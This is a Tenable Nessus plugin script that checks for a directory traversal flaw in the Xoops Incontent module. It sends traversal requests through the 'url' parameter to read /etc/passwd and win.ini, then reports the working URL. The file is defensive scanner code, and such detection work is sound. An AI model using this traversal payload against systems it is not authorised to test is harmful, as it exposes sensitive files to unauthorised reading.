#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(16282);
 script_version ("$Revision: 1.16 $");

 script_bugtraq_id(12406);
 script_osvdb_id(13282);

 script_name(english:"Xoops Incontent Module Traversal Arbitrary PHP File Source Disclosure");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Incontent, a third-party module for Xoops. 

The version of Incontent installed on the remote host fails to
sanitize user-supplied input to the 'url' parameter of the
'modules/incontent/index.php' script before using it to read a file
whose contents are returned.  By passing in a filename with directory
traversal sequences, an unauthenticated, remote attacker can leverage
this issue to read arbitrary files on the affected host, subject to
the privileges under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/alerts/2005/Jan/1013034.html" );
 script_set_attribute(attribute:"solution", value:
"Incontent is no longer maintened. Upgrade to iContent." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/01/28");
 script_cvs_date("$Date: 2015/09/24 21:08:40 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:xoops:icontent_module");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_summary(english:"Checks for the presence of Xoops Incontent module");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("xoops_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

files = make_list(
  "/etc/passwd",
  "../../../../../../../../../../../windows/win.ini",
  "../../../../../../../../../../../winnt/win.ini"
);

# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  foreach file (files)
  {
    url = string(dir, "/modules/incontent/index.php?op=aff&option=0&url=../../../../../../../../../../..", file);
    req = http_mk_get_req(port:port, item:url);
    res = http_send_recv_req(port:port, req:req);
    if (res == NULL) exit(0);

    if (res[0] =~ "^HTTP/1\/[01] 404 ") break;

    if (
      ("/passwd" >< file && egrep(pattern:".*root:.*:0:[01]:.*", string:res[2])) ||
      ("win.ini" >< file && ("[windows]" >< res || "[fonts]" >< res[2]))
    )
    {
      if (report_verbosity)
      {
        if ("win.ini" >< file) file = str_replace(find:'/', replace:'\\', string:file);

        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report += string(
            "\n",
            "Here are the contents :\n",
            "\n",
            res[2]
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
